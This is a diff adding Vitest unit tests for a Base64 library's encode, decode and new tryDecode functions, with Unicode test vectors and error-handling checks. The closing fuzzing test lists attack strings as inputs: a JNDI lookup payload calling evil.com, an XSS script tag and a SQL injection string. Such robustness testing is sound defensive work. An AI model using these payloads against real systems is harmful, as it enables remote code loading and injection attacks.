@@ -6,7 +6,7 @@
  */
 
 import { describe, it, expect } from 'vitest'
-import { encode, decode, validate, validateBase64, getStats, formatSize } from '../logic'
+import { encode, decode, tryDecode, validate, validateBase64, getStats, formatSize } from '../logic'
 
 describe('encode', () => {
   it('encodes ASCII text to Base64', () => {
@@ -369,5 +369,212 @@ describe('backward compatibility', () => {
   it('validateBase64() without options still works', () => {
     expect(validateBase64('SGVsbG8=').valid).toBe(true)
     expect(validateBase64('!!!').valid).toBe(false)
+  })
+})
+
+// ── encode: specific test vectors (Spec-aligned) ────────────────────
+
+describe('encode — specific test vectors', () => {
+  it('encodes "hello" to "aGVsbG8="', () => {
+    expect(encode('hello')).toBe('aGVsbG8=')
+  })
+
+  it('encodes "你好" (Chinese) to "5L2g5aW9"', () => {
+    expect(encode('你好')).toBe('5L2g5aW9')
+  })
+
+  it('encodes "😀" (emoji) to "8J+YgA=="', () => {
+    expect(encode('😀')).toBe('8J+YgA==')
+  })
+
+  it('encodes empty string to empty string', () => {
+    expect(encode('')).toBe('')
+  })
+
+  it('encodes mixed ASCII + CJK + emoji roundtrip-safe', () => {
+    const input = 'Hello 你好 😀 test'
+    const encoded = encode(input)
+    expect(decode(encoded)).toBe(input)
+  })
+
+  it('encodes string with all ASCII printable characters', () => {
+    const input = 'The quick brown fox jumps over the lazy dog. 1234567890!@#$%^&*()_+-=[]{}|;:,.<>?'
+    const encoded = encode(input)
+    expect(decode(encoded)).toBe(input)
+  })
+})
+
+// ── decode: specific test vectors (Spec-aligned) ────────────────────
+
+describe('decode — specific test vectors', () => {
+  it('decodes "aGVsbG8=" to "hello"', () => {
+    expect(decode('aGVsbG8=')).toBe('hello')
+  })
+
+  it('decodes "5L2g5aW9" to "你好" (Chinese)', () => {
+    expect(decode('5L2g5aW9')).toBe('你好')
+  })
+
+  it('decodes "8J+YgA==" to "😀" (emoji)', () => {
+    expect(decode('8J+YgA==')).toBe('😀')
+  })
+
+  it('decodes empty string to empty string', () => {
+    expect(decode('')).toBe('')
+  })
+
+  it('decode then encode is identity (roundtrip)', () => {
+    const base64 = 'SGVsbG8gV29ybGQ='
+    expect(encode(decode(base64))).toBe(base64)
+  })
+})
+
+// ── tryDecode: safe decode (never throws) ───────────────────────────
+
+describe('tryDecode', () => {
+  // ── Valid inputs ──────────────────────────────────────────────────
+
+  it('decodes valid Base64 "aGVsbG8=" to "hello"', () => {
+    const result = tryDecode('aGVsbG8=')
+    expect(result.success).toBe(true)
+    if (result.success) {
+      expect(result.value).toBe('hello')
+    }
+  })
+
+  it('decodes valid Base64 "5L2g5aW9" to "你好" (Chinese)', () => {
+    const result = tryDecode('5L2g5aW9')
+    expect(result.success).toBe(true)
+    if (result.success) {
+      expect(result.value).toBe('你好')
+    }
+  })
+
+  it('decodes valid Base64 "8J+YgA==" to "😀" (emoji)', () => {
+    const result = tryDecode('8J+YgA==')
+    expect(result.success).toBe(true)
+    if (result.success) {
+      expect(result.value).toBe('😀')
+    }
+  })
+
+  it('decodes empty string to empty string', () => {
+    const result = tryDecode('')
+    expect(result.success).toBe(true)
+    if (result.success) {
+      expect(result.value).toBe('')
+    }
+  })
+
+  it('roundtrip: encode then tryDecode returns original', () => {
+    const inputs = ['hello', '你好', '😀', 'Hello World 123!', 'a+b/c=d']
+    for (const input of inputs) {
+      const encoded = encode(input)
+      const result = tryDecode(encoded)
+      expect(result.success).toBe(true)
+      if (result.success) {
+        expect(result.value).toBe(input)
+      }
+    }
+  })
+
+  // ── Invalid inputs: must return friendly error, never throw ───────
+
+  it('returns error for "abc%%%" (invalid characters), does NOT throw', () => {
+    let result: ReturnType<typeof tryDecode>
+    expect(() => {
+      result = tryDecode('abc%%%')
+    }).not.toThrow()
+    expect(result!).toBeDefined()
+    expect(result!.success).toBe(false)
+    if (!result!.success) {
+      expect(result!.error).toBeTruthy()
+      expect(result!.error).toContain('Invalid Base64')
+    }
+  })
+
+  it('returns error for "!!!" (all invalid characters), does NOT throw', () => {
+    let result: ReturnType<typeof tryDecode>
+    expect(() => {
+      result = tryDecode('!!!')
+    }).not.toThrow()
+    expect(result!).toBeDefined()
+    expect(result!.success).toBe(false)
+    if (!result!.success) {
+      expect(result!.error).toContain('Invalid Base64')
+    }
+  })
+
+  it('returns error for "not-base64!!!" (mixed), does NOT throw', () => {
+    let result: ReturnType<typeof tryDecode>
+    expect(() => {
+      result = tryDecode('not-base64!!!')
+    }).not.toThrow()
+    expect(result!).toBeDefined()
+    expect(result!.success).toBe(false)
+  })
+
+  it('returns error for "привет" (Cyrillic, non-Base64), does NOT throw', () => {
+    let result: ReturnType<typeof tryDecode>
+    expect(() => {
+      result = tryDecode('привет')
+    }).not.toThrow()
+    expect(result!).toBeDefined()
+    expect(result!.success).toBe(false)
+    if (!result!.success) {
+      expect(result!.error).toContain('Invalid Base64')
+    }
+  })
+
+  it('returns error for incorrect length Base64 (no padding)', () => {
+    const result = tryDecode('SGVsbG8') // 7 chars, not multiple of 4
+    expect(result.success).toBe(false)
+    if (!result.success) {
+      expect(result.error).toContain('multiple of 4')
+    }
+  })
+
+  it('returns error for Base64URL characters (dash, underscore)', () => {
+    const r1 = tryDecode('SGVsbG8-')
+    expect(r1.success).toBe(false)
+
+    const r2 = tryDecode('SGVsbG8_')
+    expect(r2.success).toBe(false)
+  })
+
+  it('returns error for Base64 with embedded spaces', () => {
+    const result = tryDecode('SGVs bG8=')
+    expect(result.success).toBe(false)
+    if (!result.success) {
+      expect(result.error).toContain('unexpected character')
+    }
+  })
+
+  // ── Guarantee: tryDecode never throws for any string input ────────
+
+  it('never throws for any input (fuzzing smoke test)', () => {
+    const maliciousInputs = [
+      '',
+      '\x00\x00\x00',
+      '\n\t\r',
+      '<script>alert(1)</script>',
+      '${jndi:ldap://evil.com/a}',
+      "' OR '1'='1",
+      '😀😀😀',
+      'a'.repeat(10000),
+      '====',
+      '+/+/+/+',
+    ]
+    for (const input of maliciousInputs) {
+      expect(() => tryDecode(input)).not.toThrow()
+      const result = tryDecode(input)
+      expect(result).toBeDefined()
+      expect(typeof result.success).toBe('boolean')
+      if (result.success) {
+        expect(typeof result.value).toBe('string')
+      } else {
+        expect(typeof result.error).toBe('string')
+      }
+    }
   })
 })
